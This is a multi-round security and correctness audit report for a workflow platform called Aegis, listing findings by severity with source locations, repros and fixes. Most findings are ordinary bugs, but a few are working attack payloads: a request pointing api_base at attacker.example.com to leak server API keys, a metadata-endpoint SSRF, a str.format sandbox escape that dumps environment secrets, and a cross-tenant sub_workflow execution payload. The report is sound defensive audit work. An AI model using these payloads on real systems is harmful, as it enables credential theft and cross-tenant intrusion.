# Aegis audit — round 1 findings

Read-only audit, 7 parallel slices (executor, compiler, providers/observability, security, evals, schema, frontend). Ordered by severity. All `file:line` verified against source at audit time.

## Critical / High

### 1. SSRF + env-key exfiltration via `apiBase` — `backend/app/services/llm_providers/__init__.py:168-189`
Non-Google providers take `api_base` from node `apiBase`, bound credential `base_url`, or experiment `models[].api_base` with no `url_safety` validation — the only outbound path bypassing `validate_http_url`. `api_key` falls back to server env (`OPENAI_API_KEY`, etc.) at :168-171.
- Reachable via `POST /api/playground/run`, experiments matrix, or any node's `apiBase`.
- Repro: playground `{provider:"openai", api_base:"https://attacker.example.com"}` → LiteLLM POSTs `Authorization: Bearer $OPENAI_API_KEY` to attacker host. `http://169.254.169.254/` = metadata SSRF.
- Fix: run `api_base` through `validate_http_url` (localhost allowlist only for Ollama) or never pair env keys with caller-supplied bases.

### 2. `POST /api/assist/compare` executes arbitrary node types cross-tenant — `assist.py:791-816`
`node_type` is a free string; synthetic graph runs through the real compiler. `context_ref` never sets `_user_id` (contrast `executor.py:663`), and `sub_workflow.py:51-52` skips the owner filter when `user_id` is falsy.
- Repro: `{"node_type":"sub_workflow","base_config":{"subWorkflowId":"<victim uuid>"}}` executes another user's latest workflow version, returns output. Same vector runs `code`, `http`, `integration` with real side effects; `human_approval` hangs the request.
- Fix: allowlist LLM-only node types; set `_user_id` in `context_ref`.

### 3. `sweep_stale_runs` kills live, resumable runs — `run_concurrency.py:116-170` (from `schedule_worker.py:240`)
- `active_run_ids()` is process-local; in worker mode the API sweep sees zero live tasks → any run executing >900s (`run_stale_after_seconds`) is failed mid-flight, then silently "resurrected" by `_complete_run`/`_mark_awaiting_approval`; `approve_run` then 400s on live approvals.
- `recover_stale_runs` re-queues orphans keeping original `created_at` — a re-queued run waiting >900s for a concurrency slot is swept, defeating `resume_runs_on_boot`.
- Approval grace anchors on `run.created_at` not the approval's `parked_at` (`run_concurrency.py:151`) — old run seconds into an approval gets swept, later dies "Approval timed out".

### 4. `worker.py:31` calls `Base.metadata.create_all` — bypasses the Alembic gate
Worker starting before `alembic upgrade head` creates wrong-schema tables (`embedding_vector` TEXT not `vector(768)`, no HNSW, `json` not `jsonb`) with no `alembic_version` → API boot-fails `MigrationsBehindError` and `upgrade head` dies on `DuplicateTable`. Manual DB surgery.

### 5. `models.py` uses `postgresql.UUID`, not `sa.Uuid` — `models.py:6`, ~50 columns
Emits literal `UUID` DDL on SQLite (NUMERIC affinity) → all-digit UUIDs coerce to int, ORM read raises `AttributeError`. Reintroduces the exact bug migration 021 repaired on every `create_all` DB — all tests (`conftest.py:48`) and the worker path (#4). Tests exercise a schema production never runs.

### 6. `recover_stale_runs` re-queues every non-terminal row — `startup.py:115-120`
No ownership/age filter. Two inline replicas: restarting B flips A's live `running` runs to `queued`, cancels live parked approvals → double-execution. Needs an ownership column or fail-fast if multi-replica inline is unsupported.

### 7. Error-swallowing handlers defeat error edges and retries — `node_handlers.py:141-144` (http), `:313` (code), `:534-565` (integration), `sub_workflow.py:62-63`, `compiler.py:247` (calculator), `node_handlers.py:61` (json_parse)
All return `"X error: …"` strings instead of raising → `wrap_with_context` error-branch path (`context_wrapper.py:162-179`) and retry loop never engage, yet `graph_validation.py` accepts error edges on them and the UI offers the error handle. Repro: `trigger→http→end` + error edge; unreachable URL → node "succeeds" with error text, error edge dead, `retries` ignored. Fix: raise, or reject error edges on these types.

### 8. Router/classifier/expression-agent LLM calls bypass token & cost accounting — `compiler.py:229-241`, `:191-198`
Function nodes call `generate_structured`/`generate_text` outside the ADK agent loop → `TokenTrackerPlugin` never fires: no `LlmCall` row, no RunSpan, `total_tokens`/`total_cost_usd` undercounted; `_apply_call_resilience` skipped → no per-call timeout/retry, a hung call burns `run_timeout_seconds`.

## Medium

9. **Rate-limit bypass** — `rate_limit.py:82-104`: any garbage token → fresh `user:{uuid5}` bucket; XFF trusted verbatim. Limiter runs before auth → brute-force/flood evasion on chat-session, webhooks, invoke keys.
10. **Lost-update races on `WorkflowRun.status`/`metrics_json`** — `executor.py:1824`, `_mark_awaiting_approval` 706-755, `_resume_after_tool_approval` 760-769, `_fail`/`_deny`/`_complete_run`: a `stop_run` between load and commit is silently overwritten; cancelled runs end `completed`/`failed`.
11. **Resumed runs double-count rollups** — `executor.py:2198-2208`: `record_run_rollup` per attempt, no dedup → run counted twice; `NodeResult.token_usage` overwritten while `LlmCall`/`RunSpan` accumulate → `by_model` disagrees with run header.
12. **Bound credential never type-checked vs provider** — `llm_providers/__init__.py:159-163`, `credentials.py:60-71`: Slack credential's key sent to OpenAI when misbound; `credentialName` is `first()` across all types.
13. **Terminated broker skips durable replay** — `executor.py:2319-2321`: reconnect within 120s TTL gets bare `stream_end`, loses `run_completed`/`final_output`/`metrics`.
14. **Chat session history unbound to session token** — `invoke_runner.py:54-81`: `session_id` fully client-supplied; `sid` claim (`chat_session.py:56`) never consumed → any chat-token holder can steal another user's last-50-turns context.
15. **CSRF on hosted-chat invoke cookie** — `api/chat/invoke/route.ts:44-55`: `SameSite=None`, no Origin check, no Content-Type gate → cross-site pages fire invokes under a visitor's session.
16. **`kb_retrieve` ignores `kbSource=inline` when `kbMethod=embedding`** — `node_handlers.py:406-412`: always queries workflow KB index → wrong corpus, wrong citations.
17. **Guardrail `mask`/`rewrite` pass violating content** — `guardrail.py:612-634`: `mask` only strips PII regexes, blocked keywords survive with `passed=True`; input-scope mask dropped by `before_model_callback` (`guardrail_policy_plugin.py:325-337`).
18. **`human_approval` crashes with `UUID("None")` in sub-workflows/assist** — `node_handlers.py:455`: `str(None)` truthy → `park_approval("None")` → ValueError instead of auto-approve.
19. **Edge labels on non-branch nodes → routes that never fire** (silent mid-graph stall); **unlabeled extra edges from branch nodes fire unconditionally** (exclusive branch → accidental fan-out) — `compiler.py:721-732`, `graph_validation.py:257-266`.
20. **LangSmith scrubber misses `x-api-key`/`auth_token`/`api-key`** — `tracing.py:123-138`: secrets leak into spans in both capture modes.
21. **`generate_structured` retries on any exception** — `llm_providers/__init__.py:360-379`: auth/quota/timeout all retry → doubled billed calls, only second attempt's usage recorded.
22. **Annotation `enqueue_run` TOCTOU** — `annotation.py:39-60`: concurrent thumbs-down → IntegrityError 500 instead of returning existing task.
23. **Tool-approval keys are random UUIDs** — `agent_tools.py:98`: resume parks a new row; decisions on the pre-crash row never reach it → waiter times out.
24. **`iteration` parallel mode leaks sibling tasks on first failure** — `node_handlers.py:714-718`: `gather` without `return_exceptions`; in-flight children mutate state after run marked failed.
25. **`run_execution_mode` free string** — `RUN_EXECUTION_MODE=workers` silently skips both recovery paths (`startup.py:108,197`); should be `Literal`.
26. **Chat `?token=` never stripped from URL** — `ChatPanel.tsx:84-126`: bookmarkable/history-leaked replayable token.
27. **Run-stream resubscribe loses `lastEventId`** — `api.ts:1222`, `RunDetailView.tsx:255-284`: every flap and `awaiting_approval→running` replays from seq 0.
28. **`request()` throws raw `SyntaxError` on 2xx non-JSON** — `api.ts:113-115`: callers branching on `ApiRequestError.status` mis-handle proxy/interstitial responses.
29. **DeploySheet copy claims publish revokes credentials — it doesn't** — `platform.py:57-96`: old invoke keys keep working; false security UX.
30. **Duplicate node IDs pass validation** → last-wins `adk_nodes` (`compiler.py:969`), only last executes; `_safe_adk_name` collisions (`a.b` vs `a-b`) miswire edges — `agent_tool_schema.py:131`, `compiler.py:161-165`.

## Low

- Route name `"default"`/`"error"` on if/guardrail → unconditional edge / conflates with error-edge machinery — `compiler.py:702-732`, `graph_validation.py:80-85`.
- Sync DB I/O on event loop in NOTIFY consumer — `event_bus.py:324-341` → `fetch_run_events`/`_row_state` per NOTIFY blocks the loop executing runs.
- Approval decision emits no observability event — `runs.py:642-726`: triage shows `awaiting_approval` until run end.
- Cron scheduler skips whole minutes after slow ticks — `schedule_worker.py:219-245`, silent missed fires.
- Claimed schedule fire consumed before run row exists — `schedule_worker.py:132,157`: concurrency cap or crash loses the fire.
- Malformed OTLP input → 500s: `endTimeUnixNano` overflow, non-text `output`, duplicate `(user_id,name)` workflows on concurrent ingest — `otlp_ingest.py:139,384,229`.
- `max_eval_drop=0` unreachable — `or DEFAULT` twice (`experiments.py:147`, `experiment_runner.py:173`).
- Matrix verdict deltas describe only pair #1 — `experiment_runner.py:243-251`.
- `generate_text` drops `extra_config` on LiteLLM — guardrail JSON-mode repair hint discarded for non-Google judges — `llm_providers/__init__.py:309-319`.
- Presidio missing → regex-only `passed=True` even in production — `guardrail_presidio.py:64-72`.
- `eval_pattern` regex has no ReDoS guard — `eval_deterministic.py:88`.
- `spans?model=` never matches OTLP-ingested spans — `observability_service.py:693-700` vs `otlp_ingest.py:422-440`.
- In-memory leaks in worker mode: `_authoring_overrides`, API-side `_approval_results` grow forever — `runs.py:331`, `executor.py:123`, `approval_service.py:246`.
- `config.py`: default `database_url` is Postgres while `.env.example`/docs say SQLite; `openai_api_key`/`anthropic_api_key` declared twice.
- `/mcp` bypasses middleware rate limiting — `rate_limit.py:62-64`; `?api_key=` query param leaks keys into URL logs — `auth/deps.py:73`.
- `trust` vs `dashboards` percentiles disagree (different rank functions) — `observability_service.py:463` vs `185`.
- `retries`/`timeoutSec` validated for all types but silently ignored on bare-Agent types — `compiler.py:949`.
- `seed_pinned_outputs` uses `str()` not JSON for non-string outputs — `run_authoring.py:50` → `{{steps.x.output}}` renders Python repr on resume.
- `join` under exclusive branches deadlocks silently (waits for all inbound edges) — `graph_validation.py` doesn't flag.
- Worker-mode `claim_pending_runs`: claim→schedule not atomic; SQLite second claim writes `queued` over `running` — `run_worker.py:25-38`.
- Frontend minor: `patchRecentRun` leaves finished runs showing "running"; SSE proxy doesn't encode `params.id`; HTML error bodies land in toasts; `drop-oldest` eviction can discard `stream_end` (`executor.py:148-163`).
- `worker.py`↔`startup.py` divergence also means `migration_check_strict` gaps in `startup.py:64-68` return `False` under strict on check errors — boot continues while claiming refusal; `run_startup_tasks` reports `migrations_current=True` during DB outage.

## Verified clean (round 1)

- SSE `id:`/`data:`/`retry:` framing and `after_seq`/`Last-Event-ID` contract both directions.
- Webhook HMAC: `compare_digest`, timestamp window, replay receipts composite-PK, atomic commit.
- MCP `tools/list`/`tools/call` deployment-scoped; signature over exact body bytes; ContextVar isolation.
- Viewer middleware covers all mutating `/api`,`/v1` except intended public invoke/chat paths.
- Credential storage: Fernet `v1:` prefix, masking, secrets never returned post-issuance.
- `approve_run` CAS atomic; `publish_run_event` seq allocation retry correct; broker replay/subscribe ordering sound.
- `wait_for_approval` poll-before-deadline + `parked_at`-anchored deadlines correct across restarts.
- `compute_resume`/`prune_graph_for_resume` frontier logic consistent with checkpoint contract.
- `NodeType` union ↔ backend registry 1:1 (28/28). No `dangerouslySetInnerHTML` on user/model content.
- Assist endpoints other than `/compare` are review-only. `prompts.py` version-publish race handled.
- `chunk_text` fuzzed (2000 cases): full coverage, correct `char_start/end` citation spans.
- Migration chain 001→028 runs clean on fresh SQLite; single head; 021 repair correct/idempotent; 026 recreate clean.


---

# Round 2 (deeper pass: CRUD routers, invoke/chat internals, sandbox/SSRF, concurrency, canvas, tests/CI)

## Critical / High

### R2-1. Sandbox escape: `str.format` field traversal bypasses the dunder AST filter — `code_sandbox.py:96-101`
`visit_Attribute` blocks `__dunder__` only on `ast.Attribute` nodes; `"{0.__globals__[os].environ}".format(json.loads)` passes `validate_code_safety` and returns `dict(os.environ)` — exfiltrates `GOOGLE_API_KEY`, `DATABASE_URL`, `APP_ENCRYPTION_KEY`, `LANGSMITH_API_KEY` as node output. Verified end-to-end. `format_map` and `__class__.__base__.__subclasses__` enumeration also reachable. Fix: block attribute access on str/bytes methods or drop `.format*` from allowed calls.

### R2-2. `safe_http_request` breaks TLS on every HTTPS target — `url_safety.py:148-212`
`_url_with_pinned_host` rewrites host to a bare IP; httpx derives SNI + cert-verify hostname from `url.host`, and no `extensions={"sni_hostname": hostname}` is set (`mcp_client.py:151` does it correctly; `safe_http_request` doesn't). Every HTTPS request fails cert verification → `http_request` nodes, `dispatch_webhook`, Slack/Discord all broken for HTTPS. Tests mock `client.request`, so it's untested.

### R2-3. `safe_http_request` forwards `Authorization`/custom headers across cross-host redirects — `url_safety.py:150,176-183,221-227`
Manual redirect loop reuses `dict(headers)` unchanged each hop; httpx's built-in redirect handling strips `Authorization` on host change — this doesn't. HTTP node + `Authorization: Bearer` + 302 to another host replays the credential → key exfil primitive.

### R2-4. `worker.py` never calls `startup_http_client()` → all outbound HTTP dead in worker mode — `worker.py:20-53`, `http_client.py:24-27`
`get_http_client()` raises `RuntimeError` for every worker-process caller: `http_request` nodes return `"HTTP error: HTTP client is not initialized"`; completion/quality/alert webhooks (`executor.py:2042`, `quality_alerts.py:35`, `alerts.py:222` → `webhook.py:21`) silently return False under the blanket `except`. Compounds round-1 #4/#5 (worker boot path is broken in three independent ways).

### R2-5. `alembic/env.py:16` — `config.set_main_option("sqlalchemy.url", …)` crashes on any URL containing `%`
ConfigParser interpolation raises `ValueError: invalid interpolation syntax` — verified live. Any percent-encoded password (the norm for managed Postgres) makes `alembic upgrade head` unrunnable; CI passes only because its URLs have no `%`. Fix: escape `%`→`%%` or pass url via `context.configure`.

### R2-6. `workflow_schedules` pins latest *draft* version; schedules never follow publish — `schedule_sync.py:45`, `api/workflows.py:141,263,383,539,579`, `platform.py:56-92`
Every save re-pins `workflow_version_id` to the just-saved (possibly draft) version; `publish_version` never re-syncs schedules. Consequences: draft code runs on cron while `/v1/invoke` serves the published pin; saving a draft that removes the cron silently disables the live schedule; publishing a different cron never takes effect.

### R2-7. Runs terminated outside `execute_run` never emit `stream_end` — `run_concurrency.py:156-165`, `startup.py:141-167`, `run_concurrency.py:65-86`
`sweep_stale_runs`/`recover_stale_runs`/`mark_run_unscheduled` write terminal status directly — no `_put_run_event`, no broker notify. Attached SSE subscribers heartbeat forever (exit only on `stream_end`, `executor.py:2338-2351`); broker + `run_events` rows leak until retention.

### R2-8. `execute_run` `finally` is unguarded — one transient failure leaks `_active_tasks` forever — `executor.py:2192-2239`
Finally opens with `await _with_run_session(...)`; if it raises (DB blip/re-cancel), `stream_end` publish, `_active_tasks.pop`, `_authoring_overrides.pop`, `_drain_queued_runs` all skipped → phantom capacity consumption wedges the instance into permanent 429s; subscribers hang per R2-7.

### R2-9. `TestClient(app)` never used as context manager → `lifespan` never runs in tests
`app.state.startup_status` absent, `async_tasks._main_loop` is `None` during every request (~15+ files). `conftest.py:13` `migration_check_strict=False` is dead code; `schedule_task` thread-fallback silently drops; event listener/resume/scheduler/http-client startup paths unexercised — the environment most round-1 bugs shipped under.

### R2-10. `version_number` race + in-place overwrite lost-update — `api/workflows.py:517-537,361-381`
`save_version`/`import_into_workflow` compute `latest.version_number+1` with no row lock and no unique constraint on `(workflow_id, version_number)` → duplicate version numbers → `_latest_version` picks arbitrarily (deploy pins nondeterministic). Non-fork path: concurrent saves lost-update `latest.graph_json`. `prompts.create_version` already does the right lock-and-retry pattern.

### R2-11. Templates are fully cross-tenant — `api/templates.py:58-64,137-143`
`list_templates`/`use_template` return every tenant's full `graph_json` (instructions, credential refs, apiBase) with no owner/public filter on `models.py:573-581`. Every `POST /api/templates` silently publishes tenant-private graph content instance-wide.

### R2-12. Alert rules orphaned + baseline alerting can't fire — `api/alerts.py:85-99`, `services/alerts.py:152-160`, `api/workflows.py:722-759`
`AlertRuleCreate.workflow_id` never checked against `Workflow.user_id`/existence; `delete_workflow` doesn't delete `AlertRule`/`AlertEvent` rows (no FK) — orphaned rules scanned forever. Worse: `baseline = _metric_over_window(window*6)` is a sum over a window containing the current window → `ratio ≤ 1` always for additive metrics → `gt` baseline rules can never fire; semantics inverted vs documented "x times baseline".

## Medium

- **R2-13** Code-node results >OS pipe buffer hang — `code_sandbox.py:134,168-186`: `join()` then `get_nowait()` deadlocks on large results (child feeder blocks on full pipe); verified: 2MB result → timeout. Drain before join.
- **R2-14** `_parameterize_query`: `{{…}}` inside SQL string literal compiles to `':p0'` → silently compares against literal, zero rows; legitimate `;` in quoted string rejected — `integrations.py:194-214`.
- **R2-15** `sync_workflow_schedule` TOCTOU → duplicate schedule rows → double fire — `schedule_sync.py:33-60`, no unique constraint on `(workflow_id, trigger_node_id, cron_expr)`; `_claim_schedule_fire` dedupes per row.
- **R2-16** MCP `tools/call` args unvalidated — `mcp_server.py:253-274` → `invoke_runner.py:139,152`: non-string `session_id` → AttributeError crashes the stateless session; `session_id`>128 → Postgres DataError; string `tags` iterates to chars.
- **R2-17** Signature-leg MCP auth consumes nonce per call → batched `tools/call` reject all but one (409 replay) — `mcp_server.py:75`, `deployments.py:111`. Also `tools/list` signature replayable for 300s.
- **R2-18** Slack event webhooks unreachable: `authenticate_event_webhook` requires `X-Aegis-Event-Token`/Aegis HMAC; real Slack sends only `x-slack-signature` which is detected but never verified → every real Slack event 401s; mapper is dead code — `api/event_webhooks.py`, `deployments.py:208`.
- **R2-19** `retention.purge_old_runs`: unbounded `IN` lists — `retention.py:18-50` → `SQLITE_MAX_VARIABLE_NUMBER` OperationalError past ~32k stale runs, retried every tick forever; giant lock-holding txn on Postgres. No batching.
- **R2-20** `_dispatch_new_events` advances watermark past failed dispatches → permanent live-event loss (incl. `stream_end`) — `event_bus.py:290-303`.
- **R2-21** `_schedule_run_event_cleanup` pops by `run_key` blindly — re-executed run within 120s TTL inherits terminated broker → new subscribers get instant `stream_end`, then new attempt's `run_events` deleted mid-run — `executor.py:540-551`.
- **R2-22** `evaluate_alert_rules` cooldown check-then-write, no row lock → duplicate AlertEvents + duplicate webhook deliveries across processes; one bad commit aborts remaining rules for the tick — `alerts.py:184-205`.
- **R2-23** `mark_node_started` bumps `updated_at` on terminal checkpoint rows → stale `context_patch` sorts newest and wins in `compute_resume` → restores older input/memory on resume — `checkpoints.py:68-71,205-215`.
- **R2-24** `shutdown_active_runs` snapshots `_active_tasks` once → cancelled run's `_drain_queued_runs` spawns new tasks post-snapshot that execute DB writes during shutdown — `executor.py:2277-2288,2236`.
- **R2-25** Edge inspector free-text route on non-branch nodes: typing `"error"` makes `_error_edge_sources` treat it as an error edge and stamps sibling success edges `SUCCESS_ROUTE`, inverting semantics; on reload `graphToEdges` hides the route editor — `WorkflowCanvas.tsx:3716-3735,444-445`, `EdgeInspector.tsx:121-148`, `compiler.py:735-740`.
- **R2-26** Canvas allows self-connections/cycles; frontend validation is field-only (no acyclicity/reachability) → save-time 400 with misleading "must be acyclic" for self-loops — `WorkflowCanvas.tsx:990-1041`, `workflow-validation.ts:76-223`.
- **R2-27** Empty `switchDefault` persists route `""` → `_edge_route` maps to unconditional → edge fires for every case — `NodeInspector.tsx:1929-1936`, `compiler.py:721-732`.
- **R2-28** `DraftTextarea` silently reverts undo: draft re-seeds only on `nodeId` change → ⌘Z + next blur writes pre-undo content back — `NodeInspector.tsx:445-487`.
- **R2-29** Version-history click discards unsaved edits with no confirm and `history.clear()` (import path does confirm) — `WorkflowCanvas.tsx:1625-1651`.
- **R2-30** Run-detail approval UI regresses to stale awaiting_approval after approve: full replay on reconnect re-applies old `approval_required` event → pending card over running run; click 409s — `RunDetailView.tsx:197-213,255-284,391-407`.
- **R2-31** AnnotationQueue "Load more" is offset-paginated over a list the page itself mutates → silent skips/duplicates under "all" (re-sort) and "pending" (shrink) filters — `AnnotationQueue.tsx` + `annotation.py` list_queue ordering.
- **R2-32** `dispatch_webhook` calls `safe_http_request` without `max_body_bytes` → unbounded response buffering (multi-GB) — `webhook.py:22-28`; `node_handlers.py:137` sets the cap elsewhere.
- **R2-33** `retrieve_by_embedding` crashes on embedding-dim mismatch (model swap → every kb_retrieve fails); `embed_text` `except: pass` swaps Gemini vectors for hash vectors in same space → silently corrupted ranking — `embeddings.py:55-56,64-65,87`.
- **R2-34** `parse_document`: unbounded decompression (zip-bomb) + unbounded `pypdf` parse time; runs in endpoint threadpool → pool exhaustion — `documents.py:31-42`.
- **R2-35** `decrypt_value` returns ciphertext verbatim on `InvalidToken` (rotated key) → `v1:…` sent to providers as the plaintext secret; combined with round-1 #1 it ships to attacker `apiBase` — `crypto.py:91-99`, `credentials.py:47-57`.
- **R2-36** CLI `aegis gate`: uncaught `JSONDecodeError`/`KeyError` exit 1 masquerading as regression failure; default baseline is `versions[1]` (second-newest *saved*, not previous *published*); zero tests, dispatch-only CI — `cli/src/aegis_cli/main.py:31,63,74,99-129`.
- **R2-37** Chat `POST /v1/chat/session` returns session token in JSON body, not httpOnly cookie as documented — `api/chat.py` vs `models.py:56`/CLAUDE.md.

## Low

- `url_safety` residuals: CGNAT `100.64.0.0/10` + `198.18.0.0/15` pass; `_url_with_pinned_host` drops userinfo; `Host` header omits non-default port; stream path only 303→GET vs non-stream 301/302/303; double `getaddrinfo` per request+redirect — `url_safety.py:19-26,109-115,151,180-182,224`.
- `_post_integration_webhook` calls `validate_http_url` synchronously on the event loop — `integrations.py:35`.
- `_PG_ENGINES` unbounded dict keyed by URL+password, create race → duplicate undisposed engines; `run_postgres_integration` no `statement_timeout` (`SELECT pg_sleep(3600)` passes SELECT allowlist); `smtp_host`/`to_addr` SSRF-via-config; Slack message uncapped vs Discord 2000 — `integrations.py:96,158-246`.
- `context_wrapper`: decision node + error edge → unlabeled success edges permanently dead (`compiler.py:782-783`, `context_wrapper.py:184-191`); `last_output` dead store (:73-80); parallel branches write shared `context_ref` dict from real threads, no lock (`node_handlers.py:289-298,397-404`).
- Retrieval stack: `_search_via_store`/`kb_cache` load entire KB incl. embeddings per run; store hits unfiltered `score` vs JSON's `>0`; BM25 IDF uses doc's own tf as df — mathematically wrong on default `kbMethod`; `run_search` echoes query on unknown provider — `vector_search.py:74-90,169`, `knowledge_base.py:86`, `search.py:52-53`, `embeddings.py:84-86`.
- `upload_knowledge_document` size cap ineffective — Starlette spools full multipart body before handler's bounded read — `workflows.py:842-847`.
- `delete_workflow` bulk-deletes `KnowledgeDocument` bypassing `delete_embedding_vector` → orphaned `vec_knowledge` rows — `workflows.py:756`.
- Input-validation → Postgres 500s cluster: unbounded strings vs fixed-width columns across `platform.py:366-388`, `workflows.py:126-127,234,432-437,815-868`, `feedback.py:22`, `alerts.py:27` (NaN/inf threshold silently never-fires); bulk knowledge payload unbounded into `background_jobs.payload_json`.
- `authenticate_*` `db.rollback()` on nonce IntegrityError clobbers caller session state (latent trap); cross-deployment receipt cleanup inside caller txn — `deployments.py:203,289`.
- OTLP `resolve_external_workflow` matches any workflow by name → ingesting `"MyRealWorkflow"` pollutes a user's real workflow eval history — `otlp_ingest.py:229-259`.
- `failure_rate` alert metric counts non-terminal runs in denominator — `alerts.py:85-94`.
- `asyncio_tasks._log_future` leaks `CancelledError` (BaseException) — `async_tasks.py:44-46`; `_notify_queue` unbounded — `event_bus.py:352`; `webhook_timeout_seconds` config dead — `webhook.py`; `publish_run_event` retries FK violations — `event_bus.py:124-129`.
- Cancelled-invoke path schedules without capacity recheck — `invoke_runner.py:283-288`, `platform.py:259-261`, `event_webhooks.py:116-121`.
- Schedule key change re-fires within same minute — `schedule_sync.py:50-59`.
- Session-history `created_at` ties unordered; concurrent same-session invokes fork histories — `invoke_runner.py:65-70`.
- `_session_secret` prefers account API key — wrong precedence; rotating API key kills all chat sessions — `chat_session.py:31-32`.
- `conftest.py` issues: no per-test DB isolation (persistent `test.db`, shared `DEFAULT_DEV_USER_ID` residue → ownership-filter bugs invisible); rate-bucket reset misses `node_test._rate_buckets` (always-on limiter → order-dependent 429s); `except Exception: pass` swallows stamp failures — `conftest.py:39,48,60-83`.
- Infra: `config.py:27` default `user:password` vs compose `aegis:aegis` vs `.env.example` SQLite — three-way inconsistency; `.env.example` ships `your-secret-api-key` placeholder that *works* as admin cred; undocumented settings (~20 fields); compose postgres no healthcheck; `psycopg2-binary`+`psycopg[binary]` both unpinned; `duckduckgo-search` unpinned/renamed (`search.py:5` module-load import kills app); `litellm`/`google-genai`/`httpx` unbounded vs pinned `google-adk`; `en_core_web_sm` missing from Dockerfile → `PRESIDIO_ENABLED` broken in shipped image; `@next/bundle-analyzer@^16` vs Next 14; `mcp_stdio_entry.py:38` 120s vs server 90s wait → "finished with status 'running'" misleading output.
- Frontend minor: `setApiKey` stores untrimmed key (`lib/auth.ts:48-52`); `/api/chat/session` trusts client `x-forwarded-proto` for Secure flag (`route.ts:70-78`); ChatPanel no retry on exchange, late reply lands in new conversation, no client length cap (`ChatPanel.tsx:87-208`); RunResultsPanel approve/reject not in-flight-guarded (`:130-175`); canvas `handleSave` no in-flight dedup → duplicate version numbers (`WorkflowCanvas.tsx:1776-1811`).

## Round-2 verified clean

- `expressions.py`: dict/list-only resolution, no eval/exec, missing `steps.X`→`""`, `session.N` isdigit-only, no recursion. Minor: `{{input}}` vs `{{input.text}}` disagree when input is dict; no rendered-output size cap.
- `agent_tool_schema.py`: unique/self/dup/kind checks complete.
- `event_bus`: channel naming, psycopg2/3 drain, reconnect/backoff, stop idempotence — correct.
- `executor` broker: subscribe-before-replay, seq dedup, drop-oldest keeps `stream_end` — correct.
- `checkpoints`: flush-in-caller-txn, dead-branch, frontier — correct.
- `chat_session` format/verify, nonce receipt atomicity (same txn as run), composite PK, timestamp window — correct.
- `platform.py` publish `with_for_update`; `authenticate_invoke` signature binds path+deployment+version+body.
- `datasets.copy_runs` dedup/`get_user_dataset` locks; `guardrail_policies`/`credentials`/`playground` ownership — clean.
- Import/export round-trip validates node/edge/tool types + dedups ids.
- Canvas: paste id allocation/remap, save-during-run gating, stream teardown/reconcile, secrets never in graph_json, `chat/invoke` cookie-over-body precedence — clean.
- MCP: `internal=True` skips only credential legs; `wait`/`stream` mutual exclusion enforced.
- `crypto.py` encrypt/empty/idempotence paths; `mcp_stdio_entry` env parsing.
- All async tests carry `@pytest.mark.asyncio`; `dependency_overrides` restored; `/versions` ordering matches CLI assumption.


---

# Round 3 (empirical verification + tail services + API contract + frontend rest + model/query layer)

## Verification results (throwaway repros, `backend/.venv`)

10/10 prior claims CONFIRMED:
1. `safe_http_request` HTTPS break — live TLS repro: `CERTIFICATE_VERIFY_FAILED … not valid for '127.0.0.1'`; same request with `sni_hostname` → 200. httpcore falls back `server_hostname` → `self._origin.host` (the pinned IP).
2. `switchDefault=''` → compiled `route=None` unconditional edge (fires every case).
3. `route:"error"` on non-branch node → siblings stamped `__ok__` — mechanism confirmed.
4. `version_number` race — two threads wrote `version_number=2` twice (`[1,2,2]`).
5. `decrypt_value` rotated key → returns `v1:…` ciphertext verbatim.
6. `_parameterize_query` `{{…}}` in quotes → `':p0'` literal — wrong rows / bind error.
7. `retrieve_by_embedding` dim mismatch → `ValueError` propagates.
8. `mark_node_started` `updated_at` bump → stale `context_patch` wins in `compute_resume`.
9. `_is_secret_key('x-api-key')` → False; `ghp_…` survives scrub in both capture modes.
10. `enqueue_run` TOCTOU → `IntegrityError: UNIQUE (user_id, run_id)` → 500.
Plus re-confirmed live: `"{0.__globals__[os].environ}".format(json.loads)` passes `validate_code_safety` and returns the full env (incl. real API keys).

## High

### R3-α. `GET /api/runs?tag=` filter broken on both dialects — `api/runs.py:91`, `run_filters.py`, `models.py:13-20`
`tags_json.contains([tag])` compiles through `JSONType` (base `JSON` comparator, not JSONB) → never emits `@>`/`json_each`. SQLite: `LIKE '%' || '["prod"]' || '%'` — multi-tag rows never match (verified live). Postgres: `22P02 invalid input syntax for type json` → 500. Reachable via `api.ts:974`.

### R3-β. Malformed `budget_json` 500s run creation AND kills the entire cron scan — `budgets.py:48,67`, `schedule_worker.py:125`, `schemas/workflow.py:38`
`budget_json` unvalidated; `int(runs_per_hour)`/`float(cost_per_day)` raise on non-numerics → `POST /api/runs` + `/v1/invoke` 500 forever; inside `_scan_scheduled_workflows` the call sits outside the per-item try → one poisoned budget starves EVERY schedule instance-wide each tick. `{"cost_usd_per_day": NaN}` silently disables the cap (`nan >= x` False); `{"runs_per_hour": -1}` → permanent 429.

### R3-γ. `tokens_per_run` budget never enforced — dead knob — `budgets.py:4,73-76`
`tokens_per_run_limit()` referenced only by its own test. `budget_json={"tokens_per_run":1}` → runs burn unlimited tokens. Only `cost_usd_per_day`/`runs_per_hour` work.

### R3-δ. `delete_workflow` ORM-cascades every run + child into the session — `workflows.py:764`, `models.py:38,105,145-148`
`db.delete(workflow)` loads every WorkflowRun + node_results/spans/events/checkpoints row-by-row → request timeout/memory on ~10k-run workflows. FKs already have `ondelete="CASCADE"` — bulk deletes would do it in statements, not loads.

### R3-ε. `recover_stale_jobs` fails live jobs on every API boot; `queued` jobs never re-dispatch — `startup.py:216-236`, `workflows.py:907,937`
No ownership/age/mode guard (unlike `recover_stale_runs`): multi-replica boot fails a sibling's in-flight `knowledge_bulk_import` mid-write. And `queued` jobs only dispatch via `background_tasks.add_task` at create — a restart strands them forever (no poller).

### R3-ζ. Impossible-date cron passes `cron_is_valid` then 500s every schedule-info endpoint — `cron_utils.py:10-27`, `schedule_info.py:26`, `observability_service.py:124`
`croniter("0 0 31 2 *")` constructs fine → persisted; `cron_next_runs` → `CroniterBadDateError` unhandled → `GET /api/workflows/schedules`, `/{id}/schedule`, `/api/meta/cron-preview`, observability summary all 500. The row never fires (cron_matches_now swallows) — a "valid" schedule that's permanently dead and breaks listing.

### R3-η. Node-test executes `iteration` nodes running real sub-workflows — `node_test.py:61-71` vs `node_handlers.py:685-694`
`sub_workflow` is UNSUPPORTED but `iteration` isn't: a test executes `execute_sub_workflow` per item — up to 25 real child executions (code/http/integration side effects), 30s timeout aborts mid-child leaving in-flight effects. Worse than the deliberately-blocked direct path.

### R3-θ. `/templates` page render-crashes on positionless nodes — `graph-preview.tsx:36`, `templates/page.tsx`
`previewLayout` reads `node.position.x` unguarded; backend never requires `position` (import path accepts positionless graphs) → one such template takes down `/templates` for every viewer (no error boundary). Cross-tenant per R2-11.

